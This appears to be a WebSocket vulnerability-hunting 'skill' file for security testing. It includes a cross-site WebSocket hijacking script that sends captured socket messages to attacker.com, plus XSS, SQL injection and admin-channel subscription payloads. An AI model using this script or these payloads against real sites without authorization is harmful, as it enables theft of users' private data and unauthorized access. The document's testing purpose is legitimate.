---
name: hunt-websocket
description: "Hunting skill for WebSocket vulnerabilities. Unauthenticated WebSocket access, cross-site WebSocket hijacking (CSWSH), SQLi/NoSQLi via WebSocket, user enumeration, message injection. Use when testing applications that use WebSockets for real-time communication."
---

# Hunt: WebSocket

## Detection

WebSocket connection: `ws://target.com/socket` or `wss://target.com/socket`
Identify via:
- Network tab in DevTools → WS connections
- `new WebSocket('ws://...')` in JS
- CORS headers with WebSocket upgrade: `Upgrade: websocket`

## Attack Vectors

### Unauthenticated WebSocket Access
```
ws://target.com/ws/events
→ No auth check → full access to events/messages
```
### Cross-Site WebSocket Hijacking (CSWSH)
```html
<script>
  var ws = new WebSocket('wss://target.com/ws');
  ws.onopen = function() {
    ws.send('messages');
  };
  ws.onmessage = function(e) {
    fetch('https://attacker.com/exfil?d=' + btoa(e.data));
  };
</script>
```
If WebSocket origin not validated → attacker's page can open authenticated WebSocket.

### Message Injection
```
Send: {"type": "subscribe", "channel": "admin-events"}
Send: {"userId": 1, "message": "<script>alert(1)</script>"}
```
Test: modify message payload to trigger other functionality.

### SQLi via WebSocket
```
Send: {"query": "user(id: \"1' OR '1'='1\") { id email }"}
```
WebSocket GraphQL or SQL interfaces similarly vulnerable to injection.

## Confirmation Gates
- WebSocket data accessible without auth → confirmed + high
- Cross-origin WebSocket works → confirmed + high
- Message injection alters server state → confirmed + medium

## Chain Templates
- WebSocket CSWSH + Sensitive Data Stream → exfiltrate real-time events
- WebSocket + XSS → socket manipulation from injected script
- WebSocket + IDOR → subscribe to other users' event channels
